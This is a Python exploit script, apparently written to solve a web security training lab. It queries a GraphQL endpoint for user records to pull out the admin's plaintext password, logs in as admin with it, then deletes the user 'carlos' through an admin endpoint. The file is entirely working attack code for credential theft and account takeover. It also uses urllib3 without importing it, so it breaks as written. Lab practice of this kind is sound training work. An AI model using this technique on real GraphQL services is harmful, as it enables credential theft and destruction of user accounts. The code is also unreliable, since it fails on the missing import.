import requests
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def login_acc_graphql(s, url, path, username, password):
    login_url = url + path
    payload = {
        "operationName": "login",
        "query": """
            mutation login($input: LoginInput!) {
                login(input: $input) {
                    token
                    success
                }
            }
        """,
        "variables": {
            "input": {
                "username": username,
                "password": password
            }
        }
    }
    r = s.post(login_url, json=payload)
    print(r.json())
    token = r.json().get("data", {}).get("login", {}).get("token", "")
    isSuccess = r.json().get("data", {}).get("login", {}).get("success", False)
    
    if isSuccess == True:
        print(f"[+] Successful login {username}")
        print(f"[+] Token: {token}")
        return token
    else:
        print(f"[-] Fail to login {username} account")
        sys.exit(-1)

def graphQL_query(s, url, path, userId):
    target_url = url + path
    payload = {
        "query":"\n    query getUser($id: Int!) {\n        getUser(id: $id) {\n            username\n            password\n        }\n    }",
        "operationName":"getUser",
        "variables":{
	        "id": userId
        }
    }
    r = s.post(target_url, json=payload)
    username = r.json().get("data", {}).get("getUser", {}).get("username", "")
    password = r.json().get("data", {}).get("getUser", {}).get("password", "")
    if 'admin' in username:
        print(f'[+] Found credential of admin account')
        print(f'Username = {username}')
        print(f'Password = {password}')
        return username, password
    else:
        print(f'[-] Current user is not admin')
        return None, None

def delete_user(s, url, path, username):
    target_url = url + path + f'?username={username}'
    r = s.get(target_url, allow_redirects=True)
    
    if 'User deleted successfully!' in r.text and r.status_code == 200:
        print(f'[+] Successful delete {username} account')
    else:
        print(f'[-] Failed to delete {username} account')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)
        
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 

    username, password = None, None
    for i in range(1, 6):
        username, password = graphQL_query(s, url, '/graphql/v1', i)
        if username and password: break
    token = login_acc_graphql(s, url, '/graphql/v1', username, password)
    s.cookies.set('session', token)
    delete_user(s, url, '/admin/delete', 'carlos')
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()